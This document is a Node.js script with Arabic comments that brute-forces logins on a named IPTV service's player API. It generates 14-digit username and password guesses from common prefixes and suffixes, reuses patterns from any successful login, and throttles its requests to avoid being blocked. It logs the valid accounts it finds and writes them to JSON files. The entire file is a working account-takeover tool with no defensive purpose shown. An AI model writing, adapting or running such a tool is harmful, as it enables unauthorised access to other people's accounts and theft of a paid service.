const axios = require('axios');
const fs = require('fs');
const path = require('path');

// تكوينات البحث
const CONFIG = {
    baseUrl: 'http://orien.live/player_api.php',
    maxTimeMinutes: 10,
    digitLength: 14,
    // أنماط شائعة في الأرقام
    patterns: {
        startDigits: ['163', '164', '165', '166', '167', '168', '169', '201', '202'],
        commonPrefixes: ['1630', '1631', '1632', '1634', '1635', '1636', '1637', '1638', '1639'],
        commonSuffixes: ['001', '002', '003', '111', '222', '333', '444', '555', '666', '777', '888', '999']
    }
};

// توليد أرقام ذكية
class SmartNumberGenerator {
    constructor() {
        this.generatedNumbers = new Set();
        this.lastValidPattern = null;
    }

    // توليد رقم بناءً على أنماط
    generateSmartNumber(basePattern = null) {
        let number;
        let attempts = 0;
        
        do {
            if (basePattern && this.lastValidPattern) {
                // استخدم النمط الأخير الناجح
                number = this.generateBasedOnPattern(this.lastValidPattern);
            } else if (Math.random() < 0.3) {
                // استخدام الأنماط الشائعة
                number = this.generateFromCommonPatterns();
            } else {
                // توليد عشوائي منظم
                number = this.generateStructuredRandom();
            }
            attempts++;
        } while (this.generatedNumbers.has(number) && attempts < 10);

        this.generatedNumbers.add(number);
        return number;
    }

    generateFromCommonPatterns() {
        const prefix = CONFIG.patterns.commonPrefixes[Math.floor(Math.random() * CONFIG.patterns.commonPrefixes.length)];
        const suffix = CONFIG.patterns.commonSuffixes[Math.floor(Math.random() * CONFIG.patterns.commonSuffixes.length)];
        const middleLength = CONFIG.digitLength - prefix.length - suffix.length;
        const middle = this.generateRandomDigits(middleLength);
        return prefix + middle + suffix;
    }

    generateBasedOnPattern(pattern) {
        // تعديل الرقم الأخير الناجح بشكل طفيف
        let numberArray = pattern.split('');
        const positionsToChange = Math.floor(Math.random() * 3) + 1;
        
        for (let i = 0; i < positionsToChange; i++) {
            const pos = Math.floor(Math.random() * numberArray.length);
            const newDigit = Math.floor(Math.random() * 10).toString();
            numberArray[pos] = newDigit;
        }
        
        return numberArray.join('');
    }

    generateStructuredRandom() {
        let number = '';
        // بداية منظمة
        const startDigit = CONFIG.patterns.startDigits[Math.floor(Math.random() * CONFIG.patterns.startDigits.length)];
        number += startDigit;
        
        // الأرقام المتبقية مع بعض التنظيم
        for (let i = 0; i < CONFIG.digitLength - startDigit.length; i++) {
            if (i % 3 === 0) {
                // كل 3 أرقام، استخدم رقم شائع
                number += Math.floor(Math.random() * 5).toString();
            } else {
                number += Math.floor(Math.random() * 10).toString();
            }
        }
        
        return number;
    }

    generateRandomDigits(length) {
        let result = '';
        for (let i = 0; i < length; i++) {
            result += Math.floor(Math.random() * 10).toString();
        }
        return result;
    }
}

// محاولة تسجيل الدخول
async function tryLogin(username, password) {
    const url = `${CONFIG.baseUrl}?username=${username}&password=${password}`;
    
    try {
        const response = await axios.get(url, {
            timeout: 5000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        const data = response.data;
        
        if (data.user_info && data.user_info.auth === 1) {
            return {
                success: true,
                data: data,
                username: username,
                password: password
            };
        }
        
        return {
            success: false,
            data: data
        };
    } catch (error) {
        if (error.response) {
            // استجابة بخطأ
            return {
                success: false,
                data: error.response.data
            };
        }
        // خطأ في الشبكة أو انتهاء الوقت
        return {
            success: false,
            data: null,
            error: error.message
        };
    }
}

// حفظ النتائج
function saveResults(results) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `found-credentials-${timestamp}.json`;
    const filepath = path.join(__dirname, filename);
    
    fs.writeFileSync(filepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ النتائج في: ${filename}`);
    
    // أيضاً حفظ في ملف ثابت
    const stableFilepath = path.join(__dirname, 'found-credentials.json');
    fs.writeFileSync(stableFilepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ نسخة في: found-credentials.json`);
}

// الدالة الرئيسية
async function main() {
    console.log('🚀 بدء البحث عن بيانات اعتماد صالحة...');
    console.log(`⏱️  الحد الأقصى للوقت: ${CONFIG.maxTimeMinutes} دقائق`);
    console.log(`🔢 طول الأرقام: ${CONFIG.digitLength} رقم\n`);
    
    const generator = new SmartNumberGenerator();
    const startTime = Date.now();
    const maxTimeMs = CONFIG.maxTimeMinutes * 60 * 1000;
    
    let attempts = 0;
    let successfulLogins = [];
    let consecutiveFailures = 0;
    
    while (Date.now() - startTime < maxTimeMs) {
        attempts++;
        
        // توليد بيانات الاعتماد
        const username = generator.generateSmartNumber();
        const password = generator.generateSmartNumber();
        
        console.log(`🔍 محاولة #${attempts}: username=${username}, password=${password}`);
        
        // محاولة تسجيل الدخول
        const result = await tryLogin(username, password);
        
        if (result.success) {
            console.log('✅ تم العثور على بيانات اعتماد صالحة!');
            console.log(`   Username: ${username}`);
            console.log(`   Password: ${password}`);
            console.log(`   Status: ${result.data.user_info.status}`);
            console.log(`   Expiration: ${new Date(parseInt(result.data.user_info.exp_date) * 1000).toLocaleDateString()}\n`);
            
            successfulLogins.push({
                username: username,
                password: password,
                user_info: result.data.user_info,
                server_info: result.data.server_info,
                found_at: new Date().toISOString()
            });
            
            // تحديث النمط الناجح
            generator.lastValidPattern = username;
            consecutiveFailures = 0;
            
            // حفظ النتائج فوراً
            saveResults(successfulLogins);
            
            // إذا وجدنا 3 حسابات ناجحة، نتوقف
            if (successfulLogins.length >= 3) {
                console.log('🎉 تم العثور على 3 حسابات ناجحة! إنهاء البحث.');
                break;
            }
        } else {
            console.log(`❌ فشل (auth=0)`);
            consecutiveFailures++;
            
            // إذا كان هناك 50 فشل متتالي، جرب نمطاً مختلفاً
            if (consecutiveFailures >= 50) {
                console.log('🔄 تغيير النمط بعد 50 فشل متتالي...');
                generator.lastValidPattern = null;
                consecutiveFailures = 0;
            }
        }
        
        // إضافة تأخير صغير لتجنب الحظر
        await new Promise(resolve => setTimeout(resolve, 200));
        
        // عرض التقدم
        const elapsedMinutes = Math.floor((Date.now() - startTime) / 60000);
        console.log(`⏱️  الوقت المنقضي: ${elapsedMinutes} دقيقة | المحاولات: ${attempts}\n`);
    }
    
    // النتائج النهائية
    console.log('\n📊 ملخص البحث:');
    console.log(`   إجمالي المحاولات: ${attempts}`);
    console.log(`   الحسابات الناجحة: ${successfulLogins.length}`);
    
    if (successfulLogins.length > 0) {
        console.log('\n✅ الحسابات المكتشفة:');
        successfulLogins.forEach((login, index) => {
            console.log(`   ${index + 1}. Username: ${login.username}`);
            console.log(`      Password: ${login.password}`);
            console.log(`      Status: ${login.user_info.status}`);
            console.log(`      Expires: ${new Date(parseInt(login.user_info.exp_date) * 1000).toLocaleDateString()}`);
        });
    } else {
        console.log('\n❌ لم يتم العثور على حسابات صالحة.');
    }
    
    // حفظ النتائج النهائية
    if (successfulLogins.length > 0) {
        saveResults(successfulLogins);
    }
}

// تشغيل البرنامج
main().catch(error => {
    console.error('❌ خطأ غير متوقع:', error);
    process.exit(1);
});
